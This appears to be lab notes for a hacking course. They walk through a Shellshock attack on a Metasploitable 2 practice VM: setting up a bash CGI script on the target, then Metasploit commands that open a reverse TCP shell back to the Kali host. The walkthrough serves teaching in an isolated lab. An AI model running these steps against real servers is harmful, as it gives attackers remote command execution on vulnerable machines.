# Hacking I (unprivileged permissions) 

## Todo 1: Prepare the target (metasploitable 2) 

```
# metasploitable 2 should be up and running 

# Step 1:
# als root: sudo su 
# password: msfadmin 
cd /usr/lib/cgi-bin
vi hello.sh
# --> content (#! /bin/bash will be the first line 

#! /bin/bash
echo "Content-type: text/html"
echo ""
echo "Hello world!"

# Step 2 (permissions)
chmod 755 hello.sh 

# Step 3 (test in browser of machine that can reach you metasploitable2 machine
http://192.168.10.x/cgi-bin/hello.sh 
```

## Todo 2: Proceed on kali 

```
# Connect through ssh or use desktop -> terminal as root
msfconsole 
msf>search shellshock 
msf>use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf.....>options

# We need to set the path and the ip of the target (metaploitable 2) here.
msf.....>set rhost 192.168.10.198
msf.....>set targeturi /cgi-bin/hello.sh
targeturi => /cgi-bin/hello.sh

# Now we need to decide for a payload 
msf.....>show payloads 
msf.....>set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp

# let again check the options 
msf.....>options 

# IMPORTANT: If you have 2 network interfaces, you need to set the right one 
msf.....>set lhost 192.168.10.169

# now let's try if it would work 
msf....>check 

# now let's exploit
msf....>exploit

# Try to get some info now 
whoami 

# Yes, we are successful
```

## Ref: (normal privileges)

  * https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/


